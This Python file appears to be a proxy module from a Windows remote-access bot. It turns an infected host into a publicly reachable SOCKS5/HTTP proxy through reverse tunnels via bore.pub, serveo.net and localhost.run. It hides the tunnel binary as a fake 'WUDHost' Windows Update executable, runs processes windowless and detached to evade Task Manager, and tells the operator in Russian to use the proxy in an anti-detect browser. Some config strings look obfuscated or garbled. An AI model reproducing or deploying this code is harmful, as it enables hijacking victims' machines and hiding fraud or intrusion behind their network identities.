from core.resolver import (Resolver, _UUID)
uuid = Resolver.get_mod(_UUID)

from core.resolver import (
    Resolver, _OS, _RE, _SHUTIL, _SOCKET, _SUBPROCESS, _THREADING, _TIME, _TYPING
)
os = Resolver.get_mod(_OS)
re = Resolver.get_mod(_RE)
shutil = Resolver.get_mod(_SHUTIL)
socket = Resolver.get_mod(_SOCKET)
subprocess = Resolver.get_mod(_SUBPROCESS)
threading = Resolver.get_mod(_THREADING)
time = Resolver.get_mod(_TIME)
typing_mod = Resolver.get_mod(_TYPING)
Optional, Dict = typing_mod.Optional, typing_mod.Dict

from core.base import BaseModule

class ProxyModule(BaseModule):
    "SOCKS5/HTTP Proxy: bore.exe (from tools/) or SSH-tunnel as fallback."
    _SSH_PATHS = [
        "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
        "C:\\Windows\\SysWOW64\\OpenSSH\\ssh.exe",
    ]
    _TUNNEL_SERVICES = [
        {"host": "serveo.net",    "user": None,    "port_pattern": "(\\d{4,5})"},
        {"host": "localhost.run", "user": "nokey", "port_pattern": "(\\d{4,5})"},
    ]

    # H-12b: Enhanced Proxy options for China
    _CHINA_PROXY = "\\x04Wku" # socks5
    _GIST_CONFIG_URL = "http://d|cx%l.n(xd{gh`` Errozr" 

    def __init__(self, bot=None, report_manager=None, temp_dir=None):
        super().__init__(bot, report_manager, temp_dir)
        self.proxy_active = False
        self._bore_process: Optional[subprocess.Popen] = None
        self._ssh_process:  Optional[subprocess.Popen] = None
        self._server_thread: Optional[threading.Thread] = None
        self._tunnel_url: Optional[str] = None
        self._bore_tmp: Optional[str] = None
        self._bore_output: str = ""
        self._server_error: Optional[str] = None

    def run(self) -> bool:
        """A-04: Implementation of standardized run method."""
        try:
            self.log("Starting proxy service...")
            res = self.start()
            self.log(res)
            return self.proxy_active
        except Exception as e:
            self.log(f"Proxy failed: {e}")
            return False

    def get_stats(self) -> Dict[str, int]:
        return {"active": 1 if self.proxy_active else 0}

    def start(self, local_port: int = 4444) -> str:
        if self.proxy_active:
            return "[!] Proxy already running"
        try:
            bore_exe = self._find_bore()
            if bore_exe:
                return self._start_with_bore(bore_exe, local_port)
            
            ssh_exe = self._find_ssh()
            if not ssh_exe:
                return "[!] bore.exe not found and SSH unavailable"

            self.proxy_active = True
            self._server_thread = threading.Thread(
                target=self._socks5_server, args=(local_port,), daemon=True
            )
            self._server_thread.start()
            time.sleep(0.3)

            for svc in self._TUNNEL_SERVICES:
                result = self._try_service(ssh_exe, svc, local_port)
                if result:
                    host = svc["host"]
                    self._tunnel_url = "{host}:{result}"
                    msg = (
                        "OK: SOCKS5 started ({host})\\n\\n" +
                        "Address: `{host}:{result}`\\n\\n" +
                        "Browser Settings:\\n" +
                        "Type: SOCKS5\\nHost: {host}\\nPort: {result}"
                    )
                    return msg.replace('\\n', '\n').format(host=host, result=result)
                if self._ssh_process:
                    try: self._ssh_process.kill()
                    except: pass
                    self._ssh_process = None
            
            self.stop()
            return "[!] Timeout: No tunnel service responded"
        except Exception as e:
            self.stop()
            return "[!] Proxy Error: {e}".format(e=e)

    def stop(self) -> str:
        self.proxy_active = False
        self._tunnel_url = None
        for proc in (self._bore_process, self._ssh_process):
            if proc:
                try: proc.kill()
                except: pass
        self._bore_process = None
        self._ssh_process = None
        if self._bore_tmp and os.path.exists(self._bore_tmp):
            try: os.remove(self._bore_tmp)
            except: pass
            self._bore_tmp = None
        try:
            subprocess.run(
                ["taskkill", "/F", "/IM", "bore.exe"],
                capture_output=True,
                creationflags=0x08000000, # CREATE_NO_WINDOW
            )
        except: pass
        return "[!] Proxy stopped"

    def _find_bore(self) -> Optional[str]:
        base = os.path.dirname(os.path.abspath(__file__))
        root = os.path.dirname(base)  
        candidates = [
            os.path.join(root, "tools", "bore.exe"),
            os.path.join(base, "bore.exe"),
            os.path.join(root, "bore.exe"),
        ]
        for p in candidates:
            if os.path.exists(p): return p
        return None

    def _start_with_bore(self, bore_src: str, local_port: int) -> str:
        local = os.environ.get("LOCALAPPDATA", os.environ.get("TEMP", ""))
        bore_dir = os.path.join(local, "Microsoft", "Windows", "Update")
        os.makedirs(bore_dir, exist_ok=True)
        rand_name = f"WUDHost-{uuid.uuid4().hex[:6].upper()}.exe"
        bore_tmp = os.path.join(bore_dir, rand_name)
        try:
            shutil.copy2(bore_src, bore_tmp)
        except OSError as e:
            if getattr(e, 'winerror', None) == 225:
                return "[!] Defender blocked file. Add exclusion for:" + bore_dir
            return f"[!] Copy error: {e}"
        
        self.proxy_active = True
        if not (self._server_thread and self._server_thread.is_alive()):
            self._server_thread = threading.Thread(
                target=self._socks5_server, args=(local_port,), daemon=True
            )
            self._server_thread.start()
            
            # Wait and check for bind error
            start_t = time.time()
            while time.time() - start_t < 2.0:
                if self._server_error:
                    return self._server_error
                # Try to connect to check if listening
                try:
                    socket.create_connection(("127.0.0.1", local_port), timeout=0.5).close()
                    break 
                except:
                    time.sleep(0.1)
        
        # Start bore process
        self.log(f"Starting bore from {bore_tmp} to {local_port}")
        self._bore_process = subprocess.Popen(
            [bore_tmp, "local", str(local_port), "--to", "bore.pub"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,  
            text=True, encoding="utf-8", errors="replace",
            creationflags=0x08000000, # CREATE_NO_WINDOW
        )

        # Wait for public port with a slightly more flexible regex
        # Pattern: bore\.pub:(\d+) -> decrypted as "bore\.pub:(\d+)"
        # We'll use the decrypted pattern but ensure we're looking in the whole line
        public_port = self._wait_for_port("bore\\.pub:(\\d+)", timeout=15)
        
        if public_port:
            self.log(f"Bore tunnel established at port {public_port}")
            self._tunnel_url = "bore.pub:{public_port}"
            msg = (
                "✅ SOCKS5 прокси запущен!\\n\\n" +
                "🌐 Адрес: `bore.pub:{public_port}`\\n\\n" +
                "📱 В антидетект браузере:\\n" +
                "• Тип: SOCKS5\\n" +
                "• Host: bore.pub\\n" +
                "• Port: {public_port}"
            )
            return msg.replace('\\n', '\n').format(public_port=public_port)
        
        # If we failed, capture diagnostic info
        diag = self._bore_output.strip()
        self.log(f"Bore failed to establish tunnel. Output: {diag[:200]}...")
        self.stop()
        
        if "retry after" in diag.lower():
            return "[!] Bore server rate limited. Please wait a few minutes."
        
        return "[!] bore error. Output:\\n`{diag}`" if diag else "[!] Timeout: bore did not respond."

    def _find_ssh(self) -> Optional[str]:
        for path in self._SSH_PATHS:
            if os.path.exists(path): return path
        found = shutil.which("ssh")
        return found

    def _try_service(self, ssh_exe: str, svc: dict, local_port: int) -> Optional[str]:
        remote = f"nokey@{svc['host']}" if svc["user"] else svc["host"]
        cmd = [
            ssh_exe, "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=20",
            "-o", "ServerAliveCountMax=3", "-o", "ExitOnForwardFailure=yes",
            "-o", "ConnectTimeout=10", "-o", "LogLevel=ERROR",
            "-R", "0:localhost:{local_port}", remote,
        ]
        # 0x00000008 = DETACHED_PROCESS, prevents the child from being grouped under the Python parent tree in Task Manager
        flags = subprocess.CREATE_NO_WINDOW | 0x00000008
        self._ssh_process = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, encoding="utf-8", errors="replace",
            creationflags=flags,
        )
        return self._wait_for_port(svc["port_pattern"], timeout=15)

    def _wait_for_port(self, pattern: str, timeout: float = 15) -> Optional[str]:
        self._bore_output = ""
        result = [None]
        def reader():
            proc = self._bore_process or self._ssh_process
            if not proc: return
            try:
                while proc.poll() is None:
                    line = proc.stdout.readline()
                    if not line: break
                    self._bore_output += line
                    if result[0] is None:
                        m = re.search(pattern, line, re.IGNORECASE)
                        if m: result[0] = m.group(1)
            except: pass
        t = threading.Thread(target=reader, daemon=True)
        t.start()
        start = time.time()
        while time.time() - start < timeout:
            if result[0]: break
            proc = self._bore_process or self._ssh_process
            if proc and proc.poll() is not None: break
            time.sleep(0.3)
        return result[0]

    def log(self, message: str):
        try:
            cur_time = time.strftime('%H:%M:%S')
            prefix = f"[{self.__class__.__name__}]"
            full_msg = f"{cur_time} | {prefix} {message}"
            print(full_msg)
            log_path = os.path.join(os.environ.get("TEMP", "."), "proxy_debug.log")
            with open(log_path, "a", encoding="utf-8") as f:
                f.write(f"{full_msg}\n")
        except: pass

    def _recv_exactly(self, conn: socket.socket, n: int) -> Optional[bytes]:
        data = b""
        while len(data) < n:
            try:
                packet = conn.recv(n - len(data))
                if not packet: return None
                data += packet
            except: return None
        return data

    def _socks5_server(self, port: int):
        self.log(f"Starting server on {port}")
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try: srv.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            except: pass
            try:
                # Force local bind for better reliability if 0.0.0.0 fails
                srv.bind(("127.0.0.1", port))
            except Exception as e:
                self._server_error = "Server bind error: {e}".format(e=e)
                self.log(self._server_error)
                srv.close()
                return

            srv.listen(128)
            srv.settimeout(1.0)
            while self.proxy_active:
                try:
                    client, addr = srv.accept()
                    self.log(f"Accepted connection from {addr}")
                    threading.Thread(
                        target=self._handle_client, args=(client,), daemon=True
                    ).start()
                except socket.timeout:
                    continue
                except Exception as e:
                    self.log("Server error: {e}".format(e=e))
                    break
            srv.close()
        except Exception as e:
            self.log("Server bind error: {e}".format(e=e))

    def _handle_client(self, conn: socket.socket):
        try:
            conn.settimeout(30)
            try: conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            except: pass
            first = conn.recv(1, socket.MSG_PEEK)
            if not first:
                conn.close()
                return
            if first == b'\x05':
                self._handle_socks5(conn)
            else:
                self._handle_http(conn)
        except Exception as e:
            if not isinstance(e, (socket.timeout, ConnectionResetError, OSError)):
                self.log("Client error: {e}".format(e=e))
            try: conn.close()
            except: pass

    def _handle_socks5(self, conn: socket.socket):
        try:
            header = self._recv_exactly(conn, 2)
            if not header or header[0] != 0x05:
                conn.close()
                return
            nmethods = header[1]
            methods = self._recv_exactly(conn, nmethods)
            if not methods: return
            conn.sendall(b"\x05\x00") 

            req = self._recv_exactly(conn, 4)
            if not req: return
            cmd, atyp = req[1], req[3]
            
            if cmd != 0x01: 
                conn.sendall(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
                conn.close()
                return

            if atyp == 0x01: # IPv4
                addr = self._recv_exactly(conn, 4)
                if not addr: return
                host = socket.inet_ntoa(addr)
            elif atyp == 0x03: # Domain
                len_b = self._recv_exactly(conn, 1)
                if not len_b: return
                host_b = self._recv_exactly(conn, len_b[0])
                if not host_b: return
                host = host_b.decode("utf-8", errors="replace")
            else:
                conn.sendall(b"\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00")
                conn.close()
                return
                
            port_b = self._recv_exactly(conn, 2)
            if not port_b: return
            dst_port = (port_b[0] << 8) | port_b[1]
            
            self.log("SOCKS5: {host}:{dst_port}".format(host=host, dst_port=dst_port))
            try:
                remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                remote.settimeout(30)
                try: remote.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except: pass
                remote.connect((host, dst_port))
                self.log(f"SOCKS5: Connected to {host}:{dst_port}")
                
                conn.sendall(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
                self.log("SOCKS5: Sent success response. Piping...")
                self._pipe(conn, remote)
            except Exception as e:
                self.log("Fail {host}: {e}".format(host=host, e=e))
                conn.sendall(b"\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00")
                conn.close()
        except Exception as e:
            if not isinstance(e, (socket.timeout, ConnectionResetError, OSError)):
                self.log("SOCKS5 ERR: {e}".format(e=e))
            try: conn.close()
            except: pass

    def _handle_http(self, conn: socket.socket):
        try:
            data = conn.recv(16384)
            if not data: return
            try:
                header_text = data.split("\\r\\n\\r\\n".encode(), 1)[0].decode("utf-8", errors="replace")
                first_line = header_text.split("\\r\\n")[0]
                parts = first_line.split(" ")
                if len(parts) < 2: return
                method, target = parts[0], parts[1]
            except: return
            
            if method == "CONNECT":
                host, port_s = target.rsplit(":", 1) if ":" in target else (target, "443")
                self.log("HTTP: {target}".format(target=target))
                try:
                    remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    remote.settimeout(30)
                    try: remote.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    except: pass
                    remote.connect((host, int(port_s)))
                    conn.sendall("HTTP/1.1 200 Connection Established\\r\\n\\r\\n".encode())
                    self._pipe(conn, remote)
                except Exception as e:
                    self.log("HTTP fail: {e}".format(e=e))
                    conn.sendall("HTTP/1.1 502 Bad Gateway\\r\\n\\r\\n".encode())
                    conn.close()
            else:
                self.log("HTTP: {method} {target}".format(method=method, target=target))
                url = target[7:] if target.startswith("http://") else target
                host_part = url.split("/")[0]
                host = host_part.split(":")[0]
                p = int(host_part.split(":")[1]) if ":" in host_part else 80
                try:
                    remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    remote.settimeout(30)
                    remote.connect((host, p))
                    remote.sendall(data)
                    self._pipe(conn, remote)
                except Exception as e:
                    self.log("HTTP Direct fail: {e}".format(e=e))
                    conn.close()
        except Exception as e:
            if not isinstance(e, (socket.timeout, ConnectionResetError, OSError)):
                self.log("JmYsO24UCzBgVxFdDw=".format(e=e))
            try: conn.close()
            except: pass

    def _pipe(self, a: socket.socket, b: socket.socket):
        a.settimeout(None)
        b.settimeout(None)
        def fwd(src, dst):
            try:
                while True:
                    d = src.recv(32768)
                    if not d: break
                    dst.sendall(d)
            except: pass
            finally:
                try: src.close()
                except: pass
                try: dst.close()
                except: pass
        threading.Thread(target=fwd, args=(a, b), daemon=True).start()
        threading.Thread(target=fwd, args=(b, a), daemon=True).start()
